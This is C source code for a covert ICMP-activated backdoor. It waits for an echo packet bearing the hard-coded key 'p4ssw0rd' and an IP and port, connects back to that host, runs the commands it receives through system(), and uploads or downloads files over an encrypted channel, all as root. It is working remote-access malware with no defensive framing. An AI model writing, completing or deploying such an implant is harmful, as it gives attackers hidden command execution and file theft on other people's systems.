#include <stdio.h>
#include <sys/types.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include "common.h"
#define ICMP_PACKET_SIZE 1024
#define ICMP_KEY "p4ssw0rd"

char localpath[256];
char tempfile[256];
char rmtempfile[256];
int p_pid;
char clearpid[256];

void process1();
void bash_handler(int confd, char *buf);
void fileupload_handler(int confd, char *buf);
void filedownload_handler(int confd, char *filepath);
void data_handler(int confd);
void createprocess();
int connection(char *bd_ip, unsigned short int bd_port);
void icmp_listen(void);

void process1() //bash
{
    int len, fd;
    int msg_id = creat_queue();
    char buf[MAXBUF], temp_buf[MAXBUF], _buf[MAXBUF];
    while (1)
    {
        memset(buf, '\0', MAXBUF);
        int ret = recv_msg(msg_id, BASH_TYPE, buf, MAXBUF);
        if (ret == 0)
        {
            memset(temp_buf, '\0', MAXBUF);
            memset(_buf, '\0', MAXBUF);
            if (strncasecmp(buf, "cd", 2) == 0)
            {
                if (buf[2] != ' ')
                {
                    sprintf(temp_buf, "command not found %s\n", buf);
                    send_msg(msg_id, BASH_REPLY_TYPE, temp_buf);
                }
                memcpy(_buf, &buf[3], MAXBUF - 3);
                ret = chdir(_buf);
                if (ret == -1)
                {
                    sprintf(temp_buf, "%s\n", strerror(errno));
                    send_msg(msg_id, BASH_REPLY_TYPE, temp_buf);
                }
                strcpy(temp_buf, "end");
                send_msg(msg_id, BASH_REPLY_TYPE, temp_buf);
                continue;
            }
            if (access(tempfile, F_OK) == 0)
            {
                fd = open(tempfile, O_TRUNC | O_WRONLY);
            }
            else
            {
                fd = open(tempfile, O_CREAT | O_TRUNC | O_WRONLY, 0666);
            }
            if (fd < 0)
            {
                perror("open error");
                return;
            }
            dup2(fd, 1);
            dup2(fd, 2);
            system(buf);
            close(fd);
            fd = open(tempfile, O_RDONLY);
            if (fd < 0)
            {
                perror("open error");
                return;
            }
            while ((len = read(fd, temp_buf, MAXBUF)))
            {
                if (len == -1)
                {
                    strcpy(temp_buf, "error");
                    send_msg(msg_id, BASH_REPLY_TYPE, temp_buf);
                }
                else
                {
                    send_msg(msg_id, BASH_REPLY_TYPE, temp_buf);
                }
            }
            strcpy(temp_buf, "end");
            send_msg(msg_id, BASH_REPLY_TYPE, temp_buf);
            close(fd);
        }
    }
    delete_queue(msg_id);
    exit(EXIT_SUCCESS);
}

void bash_handler(int confd, char *buf)
{
    struct msg msg1;
    msg1.type = 1;
    msg1.content.mymsgbuf.mtype = 1;
    char p_buf[_SIZE_], c_buf[_SIZE_], temp_buf[MAXBUF];
    int msg_id = get_queue();
    int ret = send_msg(msg_id, BASH_TYPE, buf);
    if (ret == -1)
    {
        perror("msgsnd error");
        return;
    }
    while (1)
    {
        ret = recv_msg(msg_id, BASH_REPLY_TYPE, temp_buf, MAXBUF);
        if (ret == 0)
        {
            if (strcmp(temp_buf, "error") == 0)
            {
                perror("send_msg fail");
                exit(EXIT_FAILURE);
            }
            else if (strcmp(temp_buf, "end") == 0)
            {
                strcpy(msg1.content.mymsgbuf.mtext, "end");
                memcpy(p_buf, &msg1, sizeof(struct msg));
                encryption(p_buf, c_buf);
                int len = Writen(confd, c_buf, _SIZE_);
                if (len <= 0)
                {
                    perror("write error");
                    exit(EXIT_FAILURE);
                }
                break;
            }
            else
            {
                memset(p_buf, 0, _SIZE_);
                memset(c_buf, 0, _SIZE_);
                strcpy(msg1.content.mymsgbuf.mtext, temp_buf);
                memcpy(p_buf, &msg1, sizeof(struct msg));
                encryption(p_buf, c_buf);
                int len = Writen(confd, c_buf, _SIZE_);
                if (len <= 0)
                {
                    perror("write error");
                    exit(EXIT_FAILURE);
                }
            }
        }
    }
}

void fileupload_handler(int confd, char *buf)
{
    struct msg msg1;
    char sFilePath[256], sDir[256], sFileName[256];
    char p_buf[_SIZE_], c_buf[_SIZE_], _buf[MAXBUF];
    strcpy(sFilePath, buf);
    FilePathParse(sFilePath, sDir, sFileName);
    if (access(sFileName, F_OK) == 0)
    {
        fprintf(stdout, "file upload fail,the file already exists!\n");
        fflush(stdout);
        msg1.type = 1;
        msg1.content.mymsgbuf.mtype = 2;
        strcpy(msg1.content.mymsgbuf.mtext, "file_exits");
        memcpy(p_buf, &msg1, sizeof(struct msg));
        encryption(p_buf, c_buf);
        int len = Writen(confd, c_buf, _SIZE_);
        if (len <= 0)
        {
            perror("write error");
            exit(EXIT_FAILURE);
        }
        return;
    }
    int fd;
    fd = open(sFileName, O_CREAT, 0664);
    close(fd);
    msg1.type = 1;
    msg1.content.mymsgbuf.mtype = 2;
    strcpy(msg1.content.mymsgbuf.mtext, buf);
    memcpy(p_buf, &msg1, sizeof(struct msg));
    encryption(p_buf, c_buf);
    int len = Writen(confd, c_buf, _SIZE_);
    if (len <= 0)
    {
        perror("write error");
        exit(EXIT_FAILURE);
    }
    fd = open(sFileName, O_WRONLY | O_TRUNC);
    setBlocking(confd);
    while (1)
    {
        memset(_buf, 0, MAXBUF);
        len = recv(confd, _buf, MAXBUF, 0);
        if (len == -1)
        {
            perror("read error");
            exit(EXIT_FAILURE);
        }
        else if (len > 0)
        {
            if (strcmp(_buf, "nofile") == 0)
            {
                perror("the sender file does not exist");
                close(fd);
                break;
            }
            else if (strcmp(_buf, "error") == 0)
            {
                perror("file transfer error");
                close(fd);
                break;
            }
            else if (strcmp(_buf, "end") == 0)
            {
                close(fd);
                break;
            }
            else
            {
                write(fd, _buf, len);
            }
        }
    }
    setNonBlocking(confd);
}

void filedownload_handler(int confd, char *filepath)
{
    int fd, ret;
    struct msg msg1;
    char p_buf[_SIZE_], c_buf[_SIZE_], buf[MAXBUF];
    if (access(filepath, F_OK) == -1)
    {
        fprintf(stdout, "file download fail,the file does not exist!\n");
        fflush(stdout);
        msg1.type = 1;
        msg1.content.mymsgbuf.mtype = 3;
        strcpy(msg1.content.mymsgbuf.mtext, "file_noexit");
        memcpy(p_buf, &msg1, sizeof(struct msg));
        encryption(p_buf, c_buf);
        int len = Writen(confd, c_buf, _SIZE_);
        if (len <= 0)
        {
            perror("write error");
            exit(EXIT_FAILURE);
        }
        return;
    }
    msg1.type = 1;
    msg1.content.mymsgbuf.mtype = 3;
    strcpy(msg1.content.mymsgbuf.mtext, filepath);
    memcpy(p_buf, &msg1, sizeof(struct msg));
    encryption(p_buf, c_buf);
    int len = Writen(confd, c_buf, _SIZE_);
    if (len <= 0)
    {
        perror("write error");
        exit(EXIT_FAILURE);
    }
    usleep(50000);
    fd = open(filepath, O_RDONLY);
    memset(buf, 0, MAXBUF);
    while ((len = read(fd, buf, MAXBUF)))
    {
        if (len == -1)
        {
            strcpy(buf, "error");
            send(confd, buf, MAXBUF, 0);
            close(fd);
            fprintf(stdout, "file transfer error!\n");
            fflush(stdout);
            return;
        }
        else
        {
            send(confd, buf, len, 0);
            //fprintf(stdout,"buf=%s,len=%d\n",buf,len);fflush(stdout);
            usleep(1000);
        }
        memset(buf, 0, MAXBUF);
    }
    strcpy(buf, "end");
    send(confd, buf, MAXBUF, 0);
    fprintf(stdout,"buf=%s,len=%d\n",buf,len);fflush(stdout);
    close(fd);
}

void data_handler(int confd)
{
    struct sockaddr_in sa;
    const unsigned char *ip;
    unsigned short port;

    socklen_t sa_len = sizeof(struct sockaddr_in);
    if (getpeername(confd, (struct sockaddr *)&sa, &sa_len) == -1)
    {
        fprintf(stdout, "Get Remote Host Failed\n");
        close(confd);
        return;
    }
    ip = (unsigned char *)inet_ntoa(sa.sin_addr);
    port = htons(sa.sin_port);
    int epoll_fd = epoll_create(OPEN_MAX);
    if (epoll_fd < 0)
    {
        fprintf(stdout, "epoll_create Fail\n");
        fflush(stdout);
        close(confd);
        exit(EXIT_FAILURE);
    }
    struct epoll_event ep_ev;
    ep_ev.events = EPOLLIN;
    ep_ev.data.fd = confd;
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, confd, &ep_ev) < 0)
    {
        fprintf(stdout, "epoll_ctl Fail\n\n");
        fflush(stdout);
        close(confd);
        exit(EXIT_FAILURE);
    }
    struct epoll_event ready_ev[OPEN_MAX];
    int timeout = -1;

    struct msg msg1;
    unsigned char p_buf[_SIZE_], c_buf[_SIZE_];
    int ret;
    int OK = 1;
    while (OK)
    {
        switch (ret = epoll_wait(epoll_fd, ready_ev, OPEN_MAX, timeout))
        {
        case -1:
            perror("epoll_wait");
            break;
        case 0:
            printf("time out...\n");
            break;
        default:
        {
            int i;
            for (i = 0; i < ret; ++i)
            {
                if (ready_ev[i].events & EPOLLIN)
                {
                    int fd = ready_ev[i].data.fd;
                    if (fd == confd)
                    {
                        int len = Readn(confd, c_buf, _SIZE_);
                        if (len > 0)
                        {
                            decode(p_buf, c_buf);
                            memcpy(&msg1, p_buf, sizeof(struct msg));
                            if (msg1.type == MSG_QUEUE_TYPE)
                            {
                                switch (msg1.content.mymsgbuf.mtype)
                                {
                                case BASH_TYPE:
                                    bash_handler(confd, msg1.content.mymsgbuf.mtext);
                                    break;
                                case FILE_UPLOAD_TYPE:
                                    fileupload_handler(confd, msg1.content.mymsgbuf.mtext);
                                    break;
                                case FILE_DOWNLOAD_TYPE:
                                    filedownload_handler(confd, msg1.content.mymsgbuf.mtext);
                                    break;
                                default:
                                    fprintf(stdout, "recv fail,because type error!!\n");
                                    fflush(stdout);
                                    break;
                                }
                            }
                            else
                            {
                                int n = Writen(confd, c_buf, _SIZE_);
                                if (n <= 0)
                                {
                                    perror("write error");
                                    exit(EXIT_FAILURE);
                                }
                                if (strncasecmp(msg1.content.message, "quit", 4) == 0)
                                {
                                    fprintf(stdout, "quit...\n");
                                    fflush(stdout);
                                    system(clearpid);
                                    if (access(tempfile, F_OK) == 0)
                                    {
                                        system(rmtempfile);
                                    }
                                    close(confd);
                                    exit(EXIT_SUCCESS);
                                }
                                else
                                {
                                    printf("recv from ip:%s port:%d massage:%s\n", ip, port, msg1.content.message);
                                }
                            }
                        }
                        else if (len == -1)
                        {
                            perror("Read error");
                            system(clearpid);
                            if (access(tempfile, F_OK) == 0)
                            {
                                system(rmtempfile);
                            }
                            exit(EXIT_SUCCESS);
                        }
                        else if (len == 0)
                        {
                            OK = 0;
                            fprintf(stdout, "\nConnection Cutdown\n\n");
                            fprintf(stdout, "quit...\n");
                            fflush(stdout);
                            system(clearpid);
                            if (access(tempfile, F_OK) == 0)
                            {
                                system(rmtempfile);
                            }
                            exit(EXIT_SUCCESS);
                        }
                    }
                }
            }
            break;
        }
        }
    }
    close(confd);
}

void createprocess()
{
    int pid = fork();
    if (pid < 0)
    {
        perror("percess1 fork error");
        exit(EXIT_FAILURE);
    }
    else if (pid == 0)
    {
        process1();
    }
    else
    {
        p_pid = pid;
        sprintf(clearpid, "kill -9 %d", p_pid);
    }
}

int connection(char *bd_ip, unsigned short int bd_port)
{
    int sd;
    struct sockaddr_in serv_addr;
    struct hostent *server;

    /* socket() */
    if ((sd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("socket error");
        return -1;
    }

    server = gethostbyname(bd_ip);
    if (server == NULL)
    {
        fprintf(stdout, "gethostbyname error for host\n");
        return -2;
    }
    bzero((char *)&serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr, server->h_length);
    serv_addr.sin_port = htons(bd_port);

    /* connect() */
    if (connect(sd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        perror("connect error");
        return -3;
    }
    return sd;
}

void icmp_listen(void)
{
    int sockfd, n, icmp_key_size;
    char buf[ICMP_PACKET_SIZE + 1];
    struct icmp *icmp;
    struct ip *ip;

    icmp_key_size = strlen(ICMP_KEY);
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    /*
     * Waiting for the activation ICMP packet
     */
    while (1)
    {
        /* get the icmp packet */
        bzero(buf, ICMP_PACKET_SIZE + 1);
        n = recv(sockfd, buf, ICMP_PACKET_SIZE, 0);
        if (n > 0)
        {
            ip = (struct ip *)buf;
            icmp = (struct icmp *)(ip + 1);

            /* If this is an ICMP_ECHO packet and if the KEY is correct  */
            if ((icmp->icmp_type == ICMP_ECHO) && (memcmp(icmp->icmp_data, ICMP_KEY, icmp_key_size) == 0))
            {
                char bd_ip[16];
                int bd_port;

                bd_port = 0;
                bzero(bd_ip, sizeof(bd_ip));
                sscanf((char *)(icmp->icmp_data + icmp_key_size + 1), "%15s %d", bd_ip, &bd_port);

                if ((bd_port <= 0) || (strlen(bd_ip) < 7))
                {
                    fprintf(stdout, "ip or port error\n");
                    continue;
                }
                sleep(1);
                int fd = connection(bd_ip, bd_port);
                fprintf(stdout, "connect success!\n");
                createprocess();
                setNonBlocking(fd);
                data_handler(fd);
                exit(EXIT_SUCCESS);
            }
            else
            {
                fprintf(stdout, "key error or icmp_type error\n");
                exit(EXIT_FAILURE);
            }
        }
    }
}

int main(int argc, char *argv[])
{
    signal(SIGCLD, SIG_IGN); //Prevent child process from becoming zombie process
    getcwd(localpath, 256);
    sprintf(tempfile, "%s/temp.txt", localpath);
    sprintf(rmtempfile, "rm %s", tempfile);
    if (getgid() != 0)
    {
        fprintf(stdout, "I'm not root\n");
        exit(EXIT_FAILURE);
    }
    icmp_listen();
    return EXIT_SUCCESS;
}
